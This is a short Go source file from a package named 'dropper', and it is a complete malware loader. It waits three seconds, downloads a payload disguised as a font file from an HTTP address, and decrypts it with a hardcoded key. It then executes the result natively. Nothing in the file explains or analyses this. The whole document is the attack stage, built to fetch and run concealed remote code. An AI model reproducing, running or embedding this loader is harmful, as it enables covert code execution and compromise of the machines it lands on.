package main

import (
	"dropper/crypt"
	"time"
)

func main() {

	time.Sleep(time.Second * 3)
	url := "http://192.168.56.101/font.woff"
	host := ""
	key := "so23k34via421fc0"
	data := crypt.Download(url, host)
	dec := crypt.Decrypt([]byte(key), data)
	crypt.RunNative(dec)

}
